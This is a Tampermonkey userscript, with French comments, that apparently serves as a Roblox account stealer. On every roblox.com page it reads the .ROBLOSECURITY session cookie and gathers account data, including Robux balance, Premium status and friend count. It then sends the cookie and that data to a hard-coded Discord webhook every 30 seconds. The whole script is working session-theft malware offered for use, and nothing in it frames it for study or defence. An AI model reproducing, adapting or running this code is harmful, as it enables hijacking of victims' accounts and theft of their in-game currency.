// ==UserScript==
// @name         Roblox Cookie & Account Info Logger (DEBUG)
// @namespace    http://tampermonkey.net/
// @version      1.1
// @description  RHAZE% - Envoie le cookie .ROBLOSECURITY et les infos du compte à un webhook Discord (avec logs de débogage).
// @author       MLK
// @grant        GM_xmlhttpRequest
// @grant        GM_getValue
// @grant        GM_setValue
// @connect      api.roblox.com
// @connect      discord.com
// @connect      economy.roblox.com
// @connect      premiumfeatures.roblox.com
// @connect      friends.roblox.com
// @connect      thumbnails.roblox.com
// @connect      users.roblox.com
// @match       https://www.roblox.com/*
// @run-at      document-end
// ==/UserScript==

(function() {
    'use strict';

    // 🔹 URL du webhook Discord (à remplacer si nécessaire)
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1502805198966493194/7BwtUSLcQP8tbHfNdR45hmYJ5rGzPs2xIJRu4RCxLuDfg7SYVVyGu-8qFZZ9Na4FJKDc";
    console.log("[DEBUG] Webhook URL:", WEBHOOK_URL);

    // 🔹 Évite d'envoyer le même cookie plusieurs fois
    const sentCookies = new Set(JSON.parse(localStorage.getItem("robloxSentCookies") || "[]"));
    console.log("[DEBUG] Cookies déjà envoyés:", Array.from(sentCookies));

    // 🔹 Récupère le cookie .ROBLOSECURITY
    function getRobloxCookie() {
        const allCookies = document.cookie;
        console.log("[DEBUG] Tous les cookies:", allCookies);

        const cookie = document.cookie.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY='));
        const cookieValue = cookie ? cookie.split('=')[1] : null;
        console.log("[DEBUG] Cookie .ROBLOSECURITY:", cookieValue ? "TROUVÉ" : "NON TROUVÉ");
        return cookieValue;
    }

    // 🔹 Envoie le cookie et les infos du compte au webhook
    async function sendToWebhook() {
        console.log("[DEBUG] Début de sendToWebhook()");

        const cookieValue = getRobloxCookie();
        if (!cookieValue) {
            console.error("[DEBUG] ❌ Cookie .ROBLOSECURITY introuvable !");
            return;
        }

        if (sentCookies.has(cookieValue)) {
            console.log("[DEBUG] ⏭️ Ce cookie a déjà été envoyé, on skip.");
            return;
        }

        try {
            console.log("[DEBUG] 🔍 Récupération des infos utilisateur...");

            // 1. Récupère les infos de base
            const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
                credentials: 'include'
            });

            if (!authRes.ok) {
                console.error("[DEBUG] ❌ Erreur lors de la récupération des infos utilisateur (HTTP " + authRes.status + ")");
                return;
            }

            const authData = await authRes.json();
            console.log("[DEBUG] Infos utilisateur récupérées:", authData);

            const userId = authData.id;
            const username = authData.name;
            const displayName = authData.displayName || authData.name;

            // 2. Récupère le solde Robux
            console.log("[DEBUG] 🔍 Récupération du solde Robux...");
            const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
                headers: { Cookie: `.ROBLOSECURITY=${cookieValue}` },
                credentials: 'include'
            });

            const robuxBalance = robuxRes.ok ? (await robuxRes.json()).robux || 0 : "Unknown";
            console.log("[DEBUG] Solde Robux:", robuxBalance);

            // 3. Récupère le statut Premium
            console.log("[DEBUG] 🔍 Vérification du statut Premium...");
            const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
                headers: { Cookie: `.ROBLOSECURITY=${cookieValue}` },
                credentials: 'include'
            });
            const isPremium = premiumRes.ok;
            console.log("[DEBUG] Statut Premium:", isPremium ? "OUI" : "NON");

            // 4. Récupère la date de création du compte
            console.log("[DEBUG] 🔍 Récupération de la date de création...");
            const profileRes = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
                headers: { Cookie: `.ROBLOSECURITY=${cookieValue}` },
                credentials: 'include'
            });

            const profileData = profileRes.ok ? await profileRes.json() : null;
            const creationYear = profileData?.created ? new Date(profileData.created).getFullYear() : "Unknown";
            console.log("[DEBUG] Année de création:", creationYear);

            // 5. Récupère le nombre d'amis
            console.log("[DEBUG] 🔍 Récupération du nombre d'amis...");
            const friendsRes = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, {
                headers: { Cookie: `.ROBLOSECURITY=${cookieValue}` },
                credentials: 'include'
            });

            const friendCount = friendsRes.ok ? (await friendsRes.json()).count || 0 : "Unknown";
            console.log("[DEBUG] Nombre d'amis:", friendCount);

            // 6. Récupère l'avatar
            console.log("[DEBUG] 🔍 Récupération de l'avatar...");
            const avatarRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
            const avatarData = avatarRes.ok ? await avatarRes.json() : null;
            const avatarUrl = avatarData?.data?.[0]?.imageUrl || "";
            console.log("[DEBUG] URL de l'avatar:", avatarUrl);

            // 🔹 Prépare le payload pour Discord
            const payload = {
                embeds: [{
                    title: "📊 Roblox Account Metrics Summary",
                    fields: [
                        { name: "Display Name", value: displayName, inline: true },
                        { name: "Username", value: username, inline: true },
                        { name: "Robux Balance", value: String(robuxBalance), inline: true },
                        { name: "Premium Status", value: isPremium ? "Yes (Premium)" : "No Premium", inline: true },
                        { name: "Account Age (Year)", value: String(creationYear), inline: true },
                        { name: "Total Friends", value: String(friendCount), inline: true }
                    ],
                    description: "**Session Cookie:**\n```" + cookieValue + "```",
                    color: 3447003,
                    thumbnail: avatarUrl ? { url: avatarUrl } : null,
                    timestamp: new Date().toISOString()
                }]
            };

            console.log("[DEBUG] Payload préparé:", payload);

            // 🔹 Envoie au webhook
            console.log("[DEBUG] 📤 Envoi au webhook...");
            await GM_xmlhttpRequest({
                method: "POST",
                url: WEBHOOK_URL,
                headers: { "Content-Type": "application/json" },
                data: JSON.stringify(payload),
                onload: function(response) {
                    console.log("[DEBUG] ✅ Réponse du webhook:", response);
                    sentCookies.add(cookieValue);
                    localStorage.setItem("robloxSentCookies", JSON.stringify(Array.from(sentCookies)));
                    console.log("[DEBUG] ✅ Cookie ajouté à la liste des cookies envoyés.");
                },
                onerror: function(error) {
                    console.error("[DEBUG] ❌ Erreur lors de l'envoi au webhook:", error);
                }
            });

        } catch (error) {
            console.error("[DEBUG] ❌ Erreur dans sendToWebhook:", error);
        }
    }

    // 🔹 Exécute la fonction dès que la page est chargée
    console.log("[DEBUG] 🚀 Démarrage du script. Attente de 2 secondes pour s'assurer que tout est chargé...");
    setTimeout(() => {
        sendToWebhook();
    }, 2000);

    // 🔹 Optionnel : Vérifie toutes les 30 secondes (au cas où le cookie change)
    setInterval(sendToWebhook, 30000);
})();
